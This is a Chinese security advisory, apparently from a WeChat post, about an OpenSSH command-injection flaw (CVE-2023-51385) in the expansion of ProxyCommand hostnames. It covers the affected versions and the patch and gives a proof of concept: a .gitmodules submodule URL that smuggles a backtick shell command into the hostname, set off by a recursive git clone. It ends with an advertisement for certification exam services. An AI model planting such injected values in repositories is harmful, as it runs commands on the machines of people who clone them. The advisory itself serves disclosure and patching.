<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6LwOlPSVQgwqkSFZ2iys7g)

**漏洞背景：**OpenSSH 是 SSH （Secure SHell） 协议的免费开源实现。SSH 协议族可以用来进行远程控制， 或在计算机之间传送文件。而实现此功能的传统方式，如 telnet(终端仿真协议)、 rcp ftp、 rlogin、rsh 都是极为不安全的，并且会使用明文传送密码。OpenSSH 提供了服务端后台程序和客户端工具，用来加密远程控制和文件传输过程中的数据，并由此来代替原来的类似服务。近日，新华三盾山实验室监测到 OpenSSH 官方发布了安全公告，修复了一个存在于 OpenSSH 中的命令注入漏洞（CVE-2023-51385），攻击者可利用该漏洞注入恶意 Shell 字符导致命令注入。

**漏洞详情：**此漏洞是由于 OpenSSH 中的 ProxyCommand 命令未对 %h、%p 或类似的扩展标记进行正确的过滤，攻击者可通过这些值注入恶意 shell 字符进行命令注入攻击。

**影响范围：**OpenSSH<9.6

**官方补丁：**目前官方已修复该漏洞，受影响用户可以升级更新到安全版本。官方下载链接：https://www.openssh.com/openbsd.html

**CVE-2023-51385  验证方法：**

首先需要在~/.ssh/config 增加如下

```
host *.example.com
  ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p

```

.gitmodules 文件语句中存在命令注入

```
url = ssh://`echo helloworld > cve.txt`foo.example.com/bar

```

配置完成后, 执行下面的指令触发

```
git clone https://github.com/zls1793/CVE-2023-51385_test --recurse-submodules

```

如果成功执行将会在 CVE-2023-51385_test 目录下生成 cve.txt 文件

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GzdTGmQpRic0NFpjLH8Jibka9z7r0dvTlTN0Pz3iatEfJgkwwtHBpP8eeBNG1ECWLBAH5xGLYwhuDWLEyOYGNAFMA/640?wx_fmt=jpeg&from=appmsg)

详细信息见这篇博客:

https://vin01.github.io/piptagole/ssh/security/openssh/libssh/remote-code-execution/2023/12/20/openssh-proxycommand-libssh-rce.html

需要考 CISP、PTE、PTS、DSG、IRE、IRS、NISP、PMP、CCSK、CISSP、ISO27001 等安全证书的师傅可以联系，价格优惠、组团更便宜。

联系微信：stonefor345

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic02ySddSLayN5oWIZvkvD3CcIMM9icbOgy9gFMAiag3Nx9LxszOibic7ibqMXp6G8zAYdNHTbtCUiaZV4EQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)